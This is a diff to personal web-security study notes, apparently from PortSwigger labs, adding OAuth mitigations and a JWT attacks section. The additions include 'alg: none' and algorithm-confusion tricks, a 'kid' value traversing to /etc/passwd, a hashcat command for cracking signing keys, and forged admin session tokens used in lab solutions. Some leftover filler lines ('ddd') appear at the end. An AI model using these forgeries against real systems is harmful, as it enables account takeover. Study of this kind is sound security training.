@@ -93,6 +93,7 @@
 - Content Type Converter: JSON to XML; XMl to JSON; Body param to JSON; Body param to XML [API testing]
 - Param Miner: identifies hidden, unlinked parameters.  useful for finding web cache poisoning vulnerabilities [API testing, Web Cache Poison]
 - HTTP request smuggler: scan request smuggling vulnerabilities > right clikc on the a request and click 'Launch smuggle probe', then watch the extension's output pane. [HTTP request smuggler]
+- JWT Editor, JSON Web Token [JWT Attack]
   
 ## SQL Injection
 **How to detect**     
@@ -4905,6 +4906,17 @@ Response: Communication timed out. (chunked size is 5)
 **SAML 2.0 asseertion flow**
 ![SAML 2.0 Assertion flow](https://developer.okta.com/img/authorization/oauth-saml2-assertion-grant-flow.png)
 
+**Mitigation**
+-  OAuth service providers  
+   - register a whitelist of valid redirect_uris
+   - Enforce use of the state parameter
+   - verify that the access token was issued to the same client_id that is making the request  
+-  OAuth client applications
+   - Use the state parameter
+   - Send a redirect_uri parameter to both /authorization and /token endpoint
+   - for openID connect id_token, validate JWS, JWE
+   - careful with authorization codes - they may be leaked via Referer headers
+
 ### OAuth Authentication Lab
 - **Authentication bypass via OAuth implicit flow**
   - an attacker to log in to other users' accounts without knowing their password
@@ -5061,9 +5073,105 @@ Response: Communication timed out. (chunked size is 5)
   - GET /me > repeater > replace the token in the authorization: Bearer
 
 ## JWT Attacks
-Content for JWT Attacks...
+- JSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems
+- A JWT consists of 3 parts: a header, a payload, and a signature 
+- The header and payload parts of a JWT are just base64url-encoded JSON objects
+- JSON Web Signature (JWS) and JSON Web Encryption (JWE)
+  ![JWT](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/jwt_ng1_en.png)
 
+**How vulnerabilities arise**
+- Exploiting flawed JWT signature verification
+  ```
+  JWT with no signature
+  {
+   "alg": "none",
+   "typ": "JWT"
+  }
+  {
+    "user": "admin",
+    "iat": 1609459200
+  }  
+  ```
+- Brute-forcing secret keys
+  - https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list
+- JWT header parameter injections
+  ```
+  (Key ID) parameter is used to inject a path traversal attack to attempt to access sensitive files.
+  {
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "../../../../../../etc/passwd"
+  }
+  ```
+- Algorithm confusion attacks
+  ```
+  An attacker might switch the algorithm from RS256 (which requires public-private key pairs) to HS256 (which uses a shared secret)
+  {
+    "alg": "HS256",
+    "typ": "JWT"
+  }
+  ```
+
+**Mitigation**  
+- Strictly validate the signature.
+- Use strong, randomly generated secret keys.
+- Sanitize and validate JWT headers.
+- Enforce strict algorithm policies.
+- 
 ### JWT Attacks Lab
+- JWT authentication bypass via unverified signature
+  - This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives. Modify your session token to gain access to the admin panel
+  - change `sub` from "wiener" to "administrator"
+    ```
+    GET /admin/delete?username=carlos
+    Cookie: session=eyJraWQiOiJiMGJjNTI2MS0wYjkxLTQ3ODQtYmQxMy00MGQ4M2FjMDUxM2IiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcyNzAyMjAyMiwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.PsFJ2Wn2uf9ec0v4_B4a9tzA4-dNLx2ONOYrnzUUV8jWUNSSOp76Lq7mbv6QR0tACdwIlN_HocozOhc2zF-lv8a9BuROr-DKZwJHC5k6upYGTng_kUeM4YL2rkCuokwdOVggu6CsHqvFTx3a1SV4QgJBs79F93tiqBHXIvL2_WmW7ADR_xHYKwuXZk4oifkC5q4_T1xZ7N5Ezbk4k4jo-a8phRjz-aoEmPFH3V5BoyACV-C74Oypzwl22xZ7RCrTvkVrzwiIaqjF3nUqSxS43DxDGwyJsF2aMcscEcZ2Lws07_jQFnACzKMBjkTUl8wRgZgz0rHu5vtFNHSRBAsEPA
+
+    payload
+    {
+    "iss": "portswigger",
+    "exp": 1727022022,
+    "sub": "administrator"
+    } 
+    ```
+- JWT authentication bypass via flawed signature verification
+  - This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs. Modify your session token to gain access to the admin panel
+  - change `sub` from "wiener" to "administrator" + change `alg` to "none" + remove the signature from the JWT
+    ```
+    GET /admin/delete?username=carlos
+    Cookie: session=eyJraWQiOiJlZTIzYjc2ZC1jNGViLTRiODAtOGE5MS00OWNkMWVjZWY5MTQiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcyNzAyMjcwMywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
+
+    {
+      "kid": "ee23b76d-c4eb-4b80-8a91-49cd1ecef914",
+      "alg": "none"
+    }
+
+    {
+      "iss": "portswigger",
+      "exp": 1727022703,
+      "sub": "administrator"
+    }
+    ```
+- JWT authentication bypass via weak signing key
+  - This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets. To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin
+  - Use "JWT Editor" extention
+  - Copy the JWT and brute-force the secret by hashcat > weak secret is "secret1"
+    `hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list`
+  - Encode "secret1" as Base64 > "c2VjcmV0MQ=="
+  - In Burp, go to `JWT Editor` tab, click `New Symmetric Key` > select "specify secret" secret 1 > input ID > generate
+    ```
+    {
+      "kty": "oct",
+      "kid": "c1da3dc6-8f36-409e-afed-ab131375978d",
+      "k": "c2VjcmV0MQ"
+    }
+    ```
+  - Use "JSON Web Token" extension
+  - select "recalculate signature" > input secret key "secret1" > send request
+- ddd
+- ddd
+- ddd
+- dd
+- dd
 
 ## Prototype Pollution
 Content for Prototype Pollution...
